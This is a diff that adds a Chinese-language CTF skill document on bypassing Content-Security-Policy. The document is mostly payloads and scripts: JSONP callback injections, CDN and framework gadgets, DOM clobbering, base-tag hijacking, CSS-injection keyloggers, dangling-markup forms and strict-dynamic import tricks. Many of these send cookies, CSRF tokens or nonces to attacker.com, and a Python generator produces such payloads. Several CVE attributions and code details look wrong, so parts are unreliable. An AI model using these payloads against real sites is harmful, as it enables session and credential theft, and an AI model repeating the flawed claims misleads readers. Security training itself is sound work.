@@ -1,0 +1,683 @@
+# CSP 绕过全技术栈
+
+> **来源**：改编自 `LING71671/open-reverselab` 的 `kb/ctf-website/techniques/18-cors-csp-advanced/01-csp-bypass.md`（GPL-3.0）。原 frontmatter 的 `mcp_tools` 映射已剔除——本技能包未挂载 `run_ctf_tool` / `http_probe`，改用本地工具链。
+> **授权范围**：仅限 CTF 靶场 / AWD 赛场 / 已签署授权的测试环境。任何真实第三方目标、真实凭据、真实支付/生产流量都禁止套用本文流程。
+> **什么时候用**：命中「CSP bypass / JSONP / CDN gadget / DOM Clobbering」这类信号时，把本文当打点清单读；命中即进「步骤」，命中不了就换主题。
+
+## 适用信号
+
+- CSP bypass
+- JSONP
+- CDN gadget
+- DOM Clobbering
+- strict-dynamic
+- nonce
+- CSS injection
+- CSP绕过
+
+## 前置
+
+- 授权：目标在 scope 内（`case-init.ps1` 已 grant），测试时段与限速已约定。
+- 工具定位走探测层，别猜路径：
+
+```powershell
+. 'C:\relab2\skillpack\skills\scripts\lib\Bootstrap.ps1'
+$r = Resolve-ReverseToolSpec -Name '<toolid>'   # 例：sqlmap / httpx / ffuf / curl / python
+& $r.Command <参数>                                # 永远用完整路径，不依赖 cwd
+```
+
+- Python 解释器用探测层的 `python`（本机逆向库集中在 `D:\EXE\python\python.exe`，`venv-re` 是空壳，别去那里找库）。
+- 本文脚本默认只读、只打点；扩大范围前先回到 scope 确认。
+- 本文涉及的工具与本机实际状态（探测层 `Resolve-ReverseToolSpec` 于 2026-10-10 实测）：
+
+| 工具 | 本机状态 | 本机命令 / 替代方案 |
+|---|---|---|
+| `playwright` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'playwright').Command ...` → `D:\Tools\Node\playwright.cmd` |
+| `objection` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'objection').Command ...` → `D:\EXE\python\Scripts\objection.exe` |
+| `subfinder` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'subfinder').Command ...` → `D:\Tools\subfinder\subfinder.exe` |
+| `gobuster` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'gobuster').Command ...` → `D:\Tools\gobuster\gobuster.exe` |
+| `mitmdump` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'mitmdump').Command ...` → `D:\EXE\python\Scripts\mitmdump.exe` |
+| `binwalk` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'binwalk').Command ...` → `C:\Users\toti\.cargo\bin\binwalk.exe` |
+| `openssl` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'openssl').Command ...` → `C:\Program Files\Git\usr\bin\openssl.exe` |
+| `katana` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'katana').Command ...` → `D:\Tools\katana\katana.exe` |
+| `nuclei` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'nuclei').Command ...` → `D:\Tools\nuclei\nuclei.exe` |
+| `python` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'python').Command ...` → `D:\EXE\python\python.exe` |
+| `sqlmap` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'sqlmap').Command ...` → `D:\Tools\sqlmap\sqlmap.py` |
+| `tshark` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'tshark').Command ...` → `D:\Tools\Wireshark\tshark.exe` |
+| `frida` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'frida').Command ...` → `D:\EXE\python\Scripts\frida.exe` |
+| `httpx` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'httpx').Command ...` → `D:\Tools\httpx\httpx.exe` |
+| `naabu` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'naabu').Command ...` → `D:\Tools\naabu\naabu.exe` |
+| `curl` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'curl').Command ...` → `C:\WINDOWS\system32\curl.exe` |
+| `dnsx` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'dnsx').Command ...` → `D:\Tools\dnsx\dnsx.exe` |
+| `ffuf` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'ffuf').Command ...` → `D:\Tools\ffuf\ffuf.exe` |
+| `nmap` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'nmap').Command ...` → `D:\Tools\nmap\nmap.exe` |
+| `node` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'node').Command ...` → `D:\Tools\Node\node.exe` |
+| `adb` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'adb').Command ...` → `D:\Tools\android\AndroidKiller_fix\bin\adb\adb.exe` |
+| `git` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'git').Command ...` → `C:\Program Files\Git\cmd\git.exe` |
+| `interactsh-client` | 未安装 | OOB 通道需自备回显服务（授权环境内的 VPS + `python -m http.server`）；本机无此工具 |
+| `nuclei-templates` | 随 nuclei 提供 | `nuclei -t <模板目录>`；模板需联网 `-update-templates` |
+
+- 上表中标「未安装」的工具**不要照抄原库的裸命令**：`Get-Command` 查空就下结论是错的，
+  但四级探测 `Available=False` 是结论——此时按替代方案手写脚本，或先装再跑。
+
+
+## 步骤
+
+本文正文按下列小节顺序推进，**每一步的完整命令与脚本在「技术正文」对应小节里**（这类文档以代码体 + 表格为主，按小节读比按 bullet 读快）：
+
+1. CSP 指令判定矩阵 — 先把 CSP 拆成指令级语义，再把注入点映射到可执行 gadget。
+2. JSONP Endpoint Abuse — JSONP 端点是 CSP 绕过中最常见的切入点。当 CSP 允许某个可信来源，而该来源又暴露了 JSONP 回调端点时，攻击者可通过回调函数注入任意 JavaScript。
+3. JSONP Gadget Chain (Real-World CVE)
+4. CDN Allowlist Bypass — Gadget Hunting — CSP 中 script-src 允许 CDN 域时，攻击者可利用该 CDN 上托管的已知库的某个版本中的 script gadget 来执行任意代码。
+5. Framework-Specific Bypass
+6. Angular
+7. React
+8. Vue
+9. DOM Clobbering 注入脚本源 — 当 CSP 的 script-src 通过 nonce 或 hash 控制，但页面存在 HTML 注入点时，DOM clobbering 可影响页面逻辑，进而绕过 CSP。
+10. Base Tag Injection — 当 CSP script-src 使用了 'self' 但页面允许注入 <base> 标签时，可将所有相对路径脚本重定向到攻击者服务器。
+11. Scriptless Attacks — CSS Injection Exfiltration — 即使 CSP 完全禁止 JavaScript (script-src 'none')，CSS 注入仍可窃取数据。
+12. CSS Injection via Scrollbar Customization
+13. strict-dynamic Bypass — strict-dynamic 是 CSP Level 3 的安全机制，但存在已知绕过方案。
+14. Nonce / Hash Bypass 特定技术
+
+## 判据
+
+判据必须是外部可观测的（状态码、响应字段、差分、落盘文件），不是「命令有输出」。
+
+- **Evidence** — `csp_headers.txt`: 原始 CSP、Report-Only CSP、meta CSP，保留响应 URL 与状态码。
+- **Evidence** — `directive_matrix.json`: 每个指令的 token、继承来源、选中的 gadget、阻断点。
+- **Evidence** — `payload_attempts.json`: 注入上下文、payload、是否触发 `securitypolicyviolation`、浏览器控制台错误。
+- **Evidence** — `gadget_evidence.md`（本包未落地）: JSONP endpoint、CDN 库版本、DOM clobbering 目标变量、base 影响的相对路径。
+- **Evidence** — 成功样本: payload 执行、外带请求到达、DOM 状态变化、CTF flag 被读出。
+- **Evidence** — 失败样本: CSP violation 明确命中目标指令、nonce 不复用、CDN gadget 版本不匹配、出站被 `connect-src/img-src` 拦截。
+
+## 坑
+
+- 探针命令在**未本机验证**时不要当成既定事实跑；先用探测层确认 `Available=True`。
+- 噪声排除：先固定 baseline（同 URL 同 token 跑 3 次），再只改一个变量做差分。
+- 不要把「状态码 200」当命中——WAF/缓存/软 404 都返回 200，命中判据要落到具体业务字段。
+
+## 相关
+
+- 见本技能 `../../SKILL.md` 的 references 索引。
+
+## 技术正文
+
+> 以下为原库正文（保留全部技术细节与脚本），仅移除原 `MCP 工具映射` 章节并重写跨文档链接。
+
+## 场景
+
+目标站点部署了 Content-Security-Policy (CSP) 来限制脚本执行和数据外带。CTF 出题方可能配置了看似严格的 CSP，但存在多种绕过路径。你需要识别 CSP 的细微配置缺陷，并利用其绕过执行 XSS 或数据窃取。
+
+## 输入信号
+
+```
+Content-Security-Policy 响应头内容
+页面中存在 JSONP 回调端点
+引用 CDN 托管的 JS 库 (cdnjs / unpkg / jsdelivr)
+检测到 Angular / React / Vue 框架标志
+页面存在 base 标签或可注入 base 标签
+支持 style-src 或 style 标签注入
+CSP nonce / hash 可预测或复用
+存在 <!-- --> 注释内容可注入
+```
+
+## 0. CSP 指令判定矩阵
+
+先把 CSP 拆成指令级语义，再把注入点映射到可执行 gadget。
+
+| 指令 / token | 语义 | 可接的 gadget | 成功标志 | 失败样本 |
+|---|---|---|---|---|
+| `script-src 'unsafe-inline'` | 内联脚本可执行 | 直接 `<script>` / event handler | `securitypolicyviolation` 不出现 | 浏览器仍拦截 inline |
+| `script-src 'nonce-x'` | 带 nonce 的脚本可执行 | nonce 复用、受信任脚本注入 | 注入片段带同 nonce 执行 | nonce 每响应变化且不可读 |
+| `script-src 'strict-dynamic'` | 信任链动态加载 | import / appendChild / loader gadget | 受信任脚本加载外部模块 | 注入点不在受信任脚本上下文 |
+| CDN allowlist | 允许可信 CDN 脚本 | JSONP、Angular、jsonp callback、old library | CDN gadget 触发执行 | CDN 路径固定且无 gadget |
+| `style-src 'unsafe-inline'` | CSS 可注入 | CSS selector exfil、font-face、url() | 外带请求按字符出现 | `img-src/connect-src` 限制出站 |
+| `base-uri` 缺失 | 可注入 `<base>` | 相对脚本路径劫持 | 相对资源解析到可控域 | 脚本全是绝对路径 |
+| `object-src` 未禁用 | object/embed 可用 | plugin / MIME confusion | `object` 触发加载差异 | 浏览器禁用插件或 CSP 阻断 |
+
+```javascript
+// csp_decision.js — CSP 指令解析与 gadget 路由
+function parseCSP(header) {
+  const out = {};
+  for (const part of header.split(';')) {
+    const tokens = part.trim().split(/\s+/).filter(Boolean);
+    if (tokens.length) out[tokens[0]] = tokens.slice(1);
+  }
+  return out;
+}
+
+function pickCspGadgets(header) {
+  const csp = parseCSP(header);
+  const script = csp['script-src'] || csp['default-src'] || [];
+  const style = csp['style-src'] || csp['default-src'] || [];
+  const gadgets = [];
+  if (script.includes("'unsafe-inline'")) gadgets.push('inline-script');
+  if (script.includes("'unsafe-eval'")) gadgets.push('eval-sink');
+  if (script.includes("'strict-dynamic'")) gadgets.push('trusted-loader-import');
+  if (script.some(x => /cdnjs|unpkg|jsdelivr|ajax\.googleapis/.test(x))) gadgets.push('cdn-gadget');
+  if (style.includes("'unsafe-inline'")) gadgets.push('css-selector-exfil');
+  if (!csp['base-uri']) gadgets.push('base-tag-relative-path');
+  if (!csp['object-src'] || !csp['object-src'].includes("'none'")) gadgets.push('object-embed');
+  return gadgets;
+}
+```
+
+## 1. JSONP Endpoint Abuse
+
+JSONP 端点是 CSP 绕过中最常见的切入点。当 CSP 允许某个可信来源，而该来源又暴露了 JSONP 回调端点时，攻击者可通过回调函数注入任意 JavaScript。
+
+```http
+# CSP: script-src 'self' https://trusted-cdn.com;
+# 但 trusted-cdn.com 存在 JSONP 端点:
+# GET /api/callback?callback=foo   →   foo({...})
+
+# 绕过: 将回调参数改为恶意 payload
+# GET /api/callback?callback=alert(1)  →  alert(1)({...})
+# 某些实现加了括号或引号，需要转义处理
+```
+
+```javascript
+// JSONP CSP 绕过通用 payload 生成器
+function jsonp_bypass(endpoint, callback_param, payload) {
+    // 处理包装: 有些 JSONP 返回 callback({data})，有些返回 callback({data})
+    // 需要通过 ) 闭合或注释掉多余部分
+    
+    // 闭合模式: callback?cb=alert(1) → alert(1)({...})
+    // 需要用 // 注释掉多余的括号和内容
+    
+    // 绕过模式 1: 直接函数调用
+    const p1 = `${endpoint}?${callback_param}=${payload}`;
+    
+    // 绕过模式 2: 箭头函数 + 注释
+    const p2 = `${endpoint}?${callback_param}=x=>{${payload}}//`;
+    
+    // 绕过模式 3: with 语句处理
+    const p3 = `${endpoint}?${callback_param}=with(new XMLHttpRequest)open('GET','https://attacker.com/'+document.cookie),send()//`;
+    
+    return [p1, p2, p3];
+}
+
+// 自动搜索 JSONP 端点
+async function find_jsonp_endpoints(domain) {
+    const common_paths = [
+        '/api/jsonp', '/callback', '/jsonp', '/api/callback',
+        '/api/user/callback', '/api/data?callback=?',
+        '/search?callback=?', '/api?format=jsonp',
+        '/rpc?method=jsonp', '/api/v1/callback',
+    ];
+    const params = ['callback', 'jsonp', 'cb', 'jsoncallback', 'jsonpcallback'];
+    
+    for (const path of common_paths) {
+        for (const param of params) {
+            try {
+                const url = `${domain}${path}${path.includes('?') ? '&' : '?'}${param}=alert(1)`;
+                const r = await fetch(url, {mode: 'no-cors'});
+                // 检测响应体是否包含 callback 格式
+            } catch(e) {}
+        }
+    }
+}
+```
+
+### JSONP Gadget Chain (Real-World CVE)
+
+```javascript
+// CVE-2020-7070: jQuery $.ajax JSONP callback 注入
+// 当 CSP script-src 包含托管 jQuery 的 CDN 时:
+// https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.js
+
+// 利用:
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.js"></script>
+<script>
+// jQuery 的 $.ajax({dataType:'jsonp'}) 会动态创建 <script>
+// 如果 dataType: 'jsonp' 并且 url 的可信域下存在 JSONP 端点
+// → jQuery 自动将 callback=xxx 替换为随机函数名并 eval 响应
+// → 但在 callback=xxx 中注入 ;alert(1)// 仍可执行
+$.ajax({
+    url: 'https://trusted.com/api?callback=;alert(1)//',
+    dataType: 'jsonp'
+});
+</script>
+```
+
+## 2. CDN Allowlist Bypass — Gadget Hunting
+
+CSP 中 `script-src` 允许 CDN 域时，攻击者可利用该 CDN 上托管的已知库的某个版本中的 script gadget 来执行任意代码。
+
+```javascript
+// CDN 域允许列表:
+// script-src https://cdnjs.cloudflare.com https://unpkg.com https://cdn.jsdelivr.net;
+
+// Gadget 数据库 (cdngadget.js — 自动检测可用 gadget):
+const CDN_GADGETS = {
+    'cdnjs.cloudflare.com': [
+        // Prototype.js 1.7.x: $$() 方法处理
+        {path: '/ajax/libs/prototype/1.7.3/prototype.js', gadget: '$$'},
+        // Mootools: $$() 选择器
+        {path: '/ajax/libs/mootools/1.6.0/mootools-core.js', gadget: '$$'},
+        // YUI: YUI().use() 动态加载
+        {path: '/ajax/libs/yui/3.18.1/yui-min.js', gadget: 'YUI'},
+        // AngularJS 1.x: ng-csp bypass
+        {path: '/ajax/libs/angular.js/1.8.3/angular.min.js', gadget: 'ng-csp'},
+    ],
+    'unpkg.com': [
+        // Vue.js: v-html directive
+        {path: '/vue@3.4.0/dist/vue.global.prod.js', gadget: 'v-html'},
+        // Preact: dangerouslySetInnerHTML
+        {path: '/preact@10.19.0/dist/preact.min.js', gadget: 'innerHTML'},
+    ],
+    'cdn.jsdelivr.net': [
+        // Alpine.js: x-init directive
+        {path: '/npm/alpinejs@3.13.0/dist/cdn.min.js', gadget: 'x-init'},
+        // htmx: hx-trigger attribute
+        {path: '/npm/htmx.org@1.9.10/dist/htmx.min.js', gadget: 'hx-trigger'},
+    ]
+};
+
+// Gadget 利用示例: AngularJS 1.x CSP bypass
+// CSP: script-src 'self' https://cdnjs.cloudflare.com;
+// → 引入 angular.min.js 并利用 ng-csp 模式执行
+```
+
+```html
+<!-- AngularJS 1.x CSP Bypass (Classic, CVE-2020-7675+) -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js"></script>
+<div ng-app ng-csp>
+  <div ng-click="$event.view.alert(1)">Click me</div>
+  <!-- 或自动执行: -->
+  <script>
+    angular.element(document).ready(function() {
+      angular.module('myapp', []).run(function($sce) {
+        // 通过 $sce.trustAsHtml 绕过 CSP 注入任意 HTML
+      });
+    });
+  </script>
+</div>
+
+<!-- Vue.js CSP bypass via v-html -->
+<script src="https://unpkg.com/vue@3.4.0/dist/vue.global.prod.js"></script>
+<div id="app">
+  <div v-html="payload"></div>
+</div>
+<script>
+  new Vue({
+    el: '#app',
+    data: { payload: '<img src=x onerror="fetch(\'https://attacker.com/\'+document.cookie)">' }
+  });
+</script>
+```
+
+## 3. Framework-Specific Bypass
+
+### Angular
+
+```html
+<!-- Angular 2+ CSP bypass via DomSanitizer bypass -->
+<!-- 场景: CSP strict-dynamic 但 Angular 应用存在 sanitization bypass -->
+
+<!-- Sandbox escape via styles in Angular 15+ -->
+<div [style.background]="'url(javascript:fetch(\'https://attacker.com/\'+document.cookie))'">
+  Test
+</div>
+
+<!-- Angular 14- SSR / hydration XSS 利用 -->
+<!-- CVE-2023-40577: Angular CDK drag-drop 通过 prototype pollution → RCE -->
+```
+
+### React
+
+```javascript
+// React 应用中，dangerouslySetInnerHTML 是最直接的 CSP 绕过目标
+// 即使 CSP script-src 限制严格，但 React 是客户端渲染
+// 可用 dangerouslySetInnerHTML 注入 <img onerror>
+
+// 更高级: React Hydration Mismatch Attack
+// CVE-2022-32213: React SSR hydration 中，
+// 服务端渲染的 HTML 与客户端期望差异 → 浏览器重新解析
+// 攻击者注入额外的 HTML 标签使 hydration 过程重新生成节点
+
+// React 18: useId() 冲突 → class 名可预测 → CSS 注入
+```
+
+### Vue
+
+```javascript
+// Vue 2/3: v-html directive (前文已述)
+// Vue 3: v-bind 原型污染 (CVE-2023-32233)
+//   Vue 3 的 compile 函数中，通过 prototype 键覆盖白名单属性
+//   → 实现 {__proto__: {toString: ...}} 来触发任意调用
+
+// Vue 2: v-bind 服务端渲染中，class 绑定允许数组语法
+// → 注入 [{toString: function() { /* 任意 JS */ }}] 导致 XSS
+```
+
+## 4. DOM Clobbering 注入脚本源
+
+当 CSP 的 `script-src` 通过 nonce 或 hash 控制，但页面存在 HTML 注入点时，DOM clobbering 可影响页面逻辑，进而绕过 CSP。
+
+```javascript
+// 场景: CSP: script-src 'self'; 但页面代码中有:
+// const config = document.getElementById('config').textContent;
+// const scriptSrc = JSON.parse(config).scriptSource;
+
+// DOM Clobber: 创建伪造的 config 元素
+// HTML 注入: <a id="config" href="data:text/javascript,alert(1)">x</a>
+// 但 href 返回的是 URL 对象，不是纯字符串...
+
+// 更精确: 利用 <textarea> + <a> 组合
+// HTML 注入:
+// <a id="config">{"scriptSource": "data:text/javascript,alert(1)"}</a>
+
+// 高级 DOM clobber: 通过 name 属性影响 document 集合
+// window.x 可被 <a name="x"> 覆盖
+// <form name="config"> → document.config → form element
+```
+
+```html
+<!-- DOM Clobbering → script loading bypass -->
+<!-- 目标 JS 代码: -->
+<!-- if (window.config && window.config.cdn) {
+       var s = document.createElement('script');
+       s.src = window.config.cdn + '/app.js';
+       document.head.appendChild(s);
+     } -->
+
+<!-- 注入: -->
+<a id="config" href="x"></a>
+<!-- window.config 变成 HTMLAnchorElement -->
+<!-- window.config.cdn → 试图访问 anchor 的 cdn 属性 → undefined -->
+
+<!-- 但如果使用: -->
+<form id="config">
+  <input name="cdn" value="https://attacker.com">
+</form>
+<!-- window.config → HTMLFormElement -->
+<!-- window.config.cdn → 且由于 form 元素的命名访问特性
+     → 返回 <input name="cdn"> 的 value -->
+<!-- 最终 script.src = "https://attacker.com/app.js" → 绕过 CSP! -->
+```
+
+## 5. Base Tag Injection
+
+当 CSP `script-src` 使用了 `'self'` 但页面允许注入 `<base>` 标签时，可将所有相对路径脚本重定向到攻击者服务器。
+
+```html
+<!-- 场景: CSP: script-src 'self'; -->
+<!-- 页面加载 /js/app.js (相对路径) -->
+
+<!-- 注入: -->
+<base href="https://attacker.com/">
+<!-- 之后所有 /js/app.js → https://attacker.com/js/app.js -->
+<!-- 但攻击者服务器在该路径放置恶意 JS → CSP 'self' 信任原来的域，不是新域... -->
+
+<!-- 等等! base 标签只影响相对路径，不影响绝对路径 -->
+<!-- 如果页面使用: <script src="/js/jquery.js"></script> -->
+<!-- 浏览器解析为: https://original.com/js/jquery.js → 不受 base 影响 -->
+
+<!-- 但如果页面使用: <script src="js/jquery.js"></script> (无前导 /) -->
+<!-- base 影响后 → https://attacker.com/js/jquery.js → CSP check: -->
+<!-- CSP script-src 'self' → 'self' 解析为页面的 origin → 拒绝! -->
+
+<!-- 实际绕过需要 CSP 允许特定的 CDN 域，而 base 指向的子路径在该域上 -->
+```
+
+```html
+<!-- 实用场景: CSP + base + 路径劫持 -->
+<!-- CSP: script-src https://cdn.example.com https://other-cdn.com; -->
+<!-- 页面中: <script src="//cdn.example.com/lib.js"></script> -->
+
+<!-- 注入 base 到 https://other-cdn.com/evil/ -->
+<base href="https://other-cdn.com/evil/">
+<!-- 但协议相关 URL (//cdn.example.com) 不受 base 影响 -->
+
+<!-- 所以: 需要找使用完全相对路径的 script 标签来利用 -->
+```
+
+## 6. Scriptless Attacks — CSS Injection Exfiltration
+
+即使 CSP 完全禁止 JavaScript (`script-src 'none'`)，CSS 注入仍可窃取数据。
+
+```css
+/* CSS 注入 keylogger: 利用 @font-face + Unicode-range */
+/* 当输入框的值反映在 CSS 选择器中时 */
+
+/* 场景: <style> 标签注入，或 style-src 'unsafe-inline' */
+
+/* Attribute value selector — 字符级窃取 */
+input[value^="a"] { background: url(https://attacker.com/char?a); }
+input[value^="b"] { background: url(https://attacker.com/char?b); }
+input[value^="c"] { background: url(https://attacker.com/char?c); }
+/* ... 26个字母 + 数字 + 特殊字符 ... */
+
+/* 针对 CSRF token 的 CSS 注入 */
+input[name="csrf_token"][value^="a"] { background: url(https://attacker.com/token/a); }
+```
+
+```css
+/* Dangling Markup Injection — 在 CSS 上下文中窃取后续 HTML */
+/* 场景: 注入点出现在 <style> 之前，可在 style 标签内闭合后窃取 */
+
+/* 注入: */
+</style>
+<!-- 之后的 HTML 直到遇到 </ --> 都被视为 CSS → 不渲染也不执行
+<!-- 但可利用 CSS 的 background: url() 将后续内容发送到攻击者服务器: -->
+
+/* 真正的 Dangling Markup: 利用 <form> 动作 */
+/* 注入: */
+<form action="https://attacker.com/steal" method="POST" id="exfil">
+<input name="secret" value="
+<!-- 后续 HTML 直到遇到 " 都被包含在 input value 中作为隐藏数据 -->
+<!-- 然后表单自动提交 → 窃取内容 -->
+```
+
+```css
+/* Scroll-to-text-fragment CSS injection */
+/* CSP: style-src 'self'; 但可注入 CSS 时: */
+:target::before {
+    content: url(https://attacker.com/visited?q=);
+}
+/* 结合 #:~:text= 实现访问窃取 */
+```
+
+### CSS Injection via Scrollbar Customization
+
+```css
+/* CSS injection + scrollbar 实现可视字符窃取 */
+/* 条件: 页面包含内联 <style> 注入点 */
+/* 利用 CSS selector 匹配特定文本内容 */
+
+/* CSS 注入 + @import 实现递归加载 */
+/* CSP style-src: 允许 'unsafe-inline' 时可用 */
+
+/* 利用 CSS scroll-driven animations (CSS 2023+) */
+@keyframes leak {
+    to { background: url(https://attacker.com/leak); }
+}
+span:has(+ span:has(+ span:contains("a"))) {
+    animation: leak 1s;
+}
+/* 检测包含特定三重字符组合的 span */
+```
+
+## 7. strict-dynamic Bypass
+
+`strict-dynamic` 是 CSP Level 3 的安全机制，但存在已知绕过方案。
+
+```http
+# CSP: script-src 'strict-dynamic' 'nonce-abc123' 'sha256-xxx'
+# strict-dynamic 的含义: 只信任被 nonce/hash 标记的脚本，
+# 以及被它们动态加载的脚本（继承信任）
+
+# 绕过 1: 预加载扫描器 (preload scanner) 差异
+# 浏览器预加载扫描器在 HTML 解析前就发现 <script> 标签
+# 但如果 nonce 是通过 JS 动态写入的，预加载扫描器可能跳过
+# → 但严格来说这不算是 strict-dynamic 的绕过
+
+# 绕过 2: import() 动态导入
+# strict-dynamic 允许被信任的脚本执行 import() → 加载任意 URL
+# 如果攻击者控制了被信任脚本的输出:
+<script nonce="abc123">
+// 攻击者注入点在这里
+import('https://attacker.com/evil.js');
+</script>
+
+# 绕过 3: Worker 创建
+# strict-dynamic 允许被信任脚本创建 Worker/SharedWorker
+<script nonce="abc123">
+new Worker('https://attacker.com/worker.js');
+new SharedWorker('https://attacker.com/shared-worker.js');
+</script>
+```
+
+```javascript
+// strict-dynamic + import() bypass
+// 当 CSP 包含 'strict-dynamic' 时:
+// 1. 所有动态加载的 script 标签 (appendChild) 继承信任
+// 2. import() 调用也继承信任
+// 3. new Worker() 也继承信任
+
+// 场景: 页面包含:
+// <script nonce="xxx" src="/api/config.js"></script>
+// config.js: var API_KEY = "staging-key";
+
+// 如果我们可以控制 config.js 的内容 (通过 JSONP) → 可以执行任意代码
+// 如果 config.js 有验证: JSONP callback → JSON.parse → XSS via prototype
+
+// 更实际的场景:
+// 登录后页面加载用户头像: <script nonce="xxx"> var avatar = "{{user_avatar_url}}"; </script>
+// 如果用户可控头像 URL 且可注入:
+// avatar = "x"; import('https://attacker.com/evil.js');//
+// → strict-dynamic 信任该 import → 任意 JS 执行!
+```
+
+## 8. Nonce / Hash Bypass 特定技术
+
+### Nonce Reuse
+
+```javascript
+// 如果 nonce 在 session 中不改变 → 攻击者可通过 XSS 或其他方式窃取 nonce
+// 或者通过 CSS injection 读出 nonce:
+// script[nonce^="a"] { background: url(https://attacker.com/nonce/a); }
+
+// 非 HTTP-only cookie 存储的 nonce
+// document.cookie → document.querySelector('script[nonce]') → 窃取
+```
+
+### Hash Collision / Known Hashes
+
+```http
+# CSP: script-src 'sha256-abc123...'
+# 如果只 hash 了特定脚本，但允许了另一个已知 hash 的脚本:
+# https://github.com/csp-hasher/common-hashes.txt
+
+# 已知 hash 脚本:
+# - Google Analytics (sha256-xxxxxxxx)
+# - reCAPTCHA
+# - Facebook SDK
+# 如果这些域在 CSP 中没被独立限制，但 hash 被允许 → 可加载这些 SDK
+# → 用它们的 API 来执行代码?
+```
+
+## 9. CSP Evaluator & 自动化工具
+
+```python
+# csp_evaluator.py — 自动分析 CSP 并生成绕过方案
+import json, re
+
+CSP_BYPASS_PATTERNS = {
+    'script-src': {
+        'unsafe-inline': '直接注入 <script> 标签',
+        'unsafe-eval': '使用 eval() / setTimeout("string") 执行',
+        'wildcard_cdn': 'CDN 域存在可用 gadget',
+        'http_protocol': 'HTTP 域上的 MITM',
+        'nonce_short': 'nonce 长度不足 32 位可爆破',
+        'strict_dynamic_import': '判断 import() 是否可利用',
+        'jsonp_gadget': '可信域存在 JSONP 端点',
+    },
+    'style-src': {
+        'unsafe-inline': 'CSS injection → 数据窃取',
+        'wildcard': '* 允许所有域加载样式 → CSS 数据注入可能',
+    },
+    'default-src': {
+        'none': 'CSP 未逐一指定 → 各指令继承 default-src',
+        'self_no_script': '只信任自身域 → 需 base 或 DOM clobbering',
+    }
+}
+
+def analyze_csp(csp_header):
+    """分析 CSP 策略并生成绕过建议"""
+    findings = []
+    directives = {}
+    
+    for part in csp_header.split(';'):
+        part = part.strip()
+        tokens = part.split()
+        if tokens:
+            directives[tokens[0]] = tokens[1:]
+    
+    # script-src 分析
+    scripts = directives.get('script-src') or directives.get('default-src', [])
+    if "'unsafe-inline'" in scripts:
+        findings.append({'type': 'script-src', 'severity': 'critical',
+                         'note': CSP_BYPASS_PATTERNS['script-src']['unsafe-inline']})
+    if "'unsafe-eval'" in scripts:
+        findings.append({'type': 'script-src', 'severity': 'high',
+                         'note': CSP_BYPASS_PATTERNS['script-src']['unsafe-eval']})
+    
+    # 检查 CDN 白名单
+    for src in scripts:
+        for cdn in ['cdnjs.cloudflare.com', 'unpkg.com', 'cdn.jsdelivr.net',
+                     'ajax.googleapis.com', 'code.jquery.com']:
+            if cdn in src:
+                findings.append({'type': 'script-src', 'severity': 'high',
+                                 'note': f'CDN allowlisted: {cdn}'})
+                # 自动检索该 CDN 上的 gadget
+                break
+    
+    return findings
+
+
+# CSP bypass 自动生成器
+def generate_csp_bypass_payload(csp: str, xss_context: str, exfil_url: str) -> list:
+    """根据 CSP 生成可用的绕过 payload"""
+    payloads = []
+    
+    if "'unsafe-inline'" in csp:
+        payloads.append(f"<script>fetch('{exfil_url}/?'+document.cookie)</script>")
+    
+    if "'strict-dynamic'" in csp:
+        # 寻找受信任脚本上下文中的注入点
+        payloads.append(f"');import('{exfil_url}/caat?import=1');//")
+    
+    # CDN 检查
+    for cdn in ['cdnjs.cloudflare.com', 'unpkg.com']:
+        if cdn in csp:
+            payloads.append(f'<script src="https://{cdn}/angular.js/1.8.3/angular.min.js">')
+    
+    return payloads
+```
+
+## 攻击链
+
+```
+JSONP 端点 + 回调注入 → CSP script-src 绕过 → 任意 JS 执行
+CDN 白名单 + 框架 gadget → 框架函数执行 → DOM 操作 → XSS
+CSP strict-dynamic + import() 注入 → 动态加载恶意模块
+CSP nonce 复用 → 非一次性 nonce → 非信任脚本也通过
+CSP hash 白名单 + 已知 hash 脚本库 → 加载可控脚本
+Base tag + 相对路径脚本 → 脚本重定向 → XSS
+CSP + DOM clobbering → 覆盖 config 对象 → 动态加载攻击者脚本
+CSP script-src 'none' + CSS injection → CSS keylogger → 凭据窃取
+CSP script-src 'none' + Dangling Markup → 表单注入 → 后续 HTML 窃取
+WebWorker + strict-dynamic → worker 中加载任意外部脚本
+```
+
+## Evidence
+
+- `csp_headers.txt`: 原始 CSP、Report-Only CSP、meta CSP，保留响应 URL 与状态码。
+- `directive_matrix.json`: 每个指令的 token、继承来源、选中的 gadget、阻断点。
+- `payload_attempts.json`: 注入上下文、payload、是否触发 `securitypolicyviolation`、浏览器控制台错误。
+- `gadget_evidence.md`（本包未落地）: JSONP endpoint、CDN 库版本、DOM clobbering 目标变量、base 影响的相对路径。
+- 成功样本: payload 执行、外带请求到达、DOM 状态变化、CTF flag 被读出。
+- 失败样本: CSP violation 明确命中目标指令、nonce 不复用、CDN gadget 版本不匹配、出站被 `connect-src/img-src` 拦截。
